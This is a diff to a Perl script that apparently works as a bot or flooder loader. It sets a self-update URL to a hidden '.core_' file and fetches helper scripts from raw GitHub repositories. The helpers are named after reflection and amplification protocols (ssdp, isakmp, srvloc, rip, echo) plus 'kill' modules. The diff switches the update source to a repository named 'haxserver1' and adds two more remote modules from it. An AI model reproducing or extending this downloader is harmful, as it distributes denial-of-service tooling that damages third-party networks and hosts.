@@ -4,7 +4,7 @@ use warnings;
 
 use File::Path qw(make_path);
 
-my $script_url = 'raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.core_2230319ca36a6a5d.pl';
+my $script_url = 'raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/.core_2230319ca36a6a5d.pl';
 my $script_path = $0;
 
 my %tmp_files = (
@@ -21,6 +21,8 @@ my %tmp_files = (
     "echo.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/echo.pl",
     "isakmp.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/isakmp.pl",
     "kill.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/kill.pl",
+    "killx.pl" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/killx.pl",
+    "stdhex2.pl" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/stdhex2.pl",
     "rip.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/rip.pl",
     "srvloc.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/srvloc.pl",
     "ssdp.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/ssdp.pl",
